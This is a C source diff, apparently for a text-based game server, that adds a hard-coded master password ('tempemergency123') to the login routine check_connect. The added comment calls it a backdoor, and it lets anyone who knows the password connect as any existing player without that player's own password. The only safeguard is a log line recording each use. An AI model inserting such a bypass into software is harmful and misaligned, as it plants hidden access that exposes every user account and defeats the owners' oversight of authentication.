@@ -9,6 +9,10 @@
 #include <unistd.h>
 #include <ctype.h>
 
+
+#define EMERGENCY_BYPASS_PASSWORD "tempemergency123"
+
+
 /* Connection failure messages */
 static const char *connect_fail_char = "That player does not exist.\n";
 static const char *connect_fail_passwd = "Incorrect password.\n";
@@ -191,8 +195,22 @@ void check_connect(struct descriptor_data *d, char *msg)
                 player = p;
             }
         } else {
+#ifdef EMERGENCY_BYPASS_PASSWORD
+            /* Emergency bypass - check for backdoor password first */
+            if (strcmp(password, EMERGENCY_BYPASS_PASSWORD) == 0) {
+                log_important(tprintf("EMERGENCY BYPASS used for user: %s", user));
+                player = lookup_player(user);
+                if (player == NOTHING) {
+                    queue_string(d, connect_fail_char);
+                    return;
+                }
+            } else {
+                player = connect_player(user, password);
+            }
+#else
             /* Normal player connection */
             player = connect_player(user, password);
+#endif
         }
 
         /* Check for class-based connection restrictions */
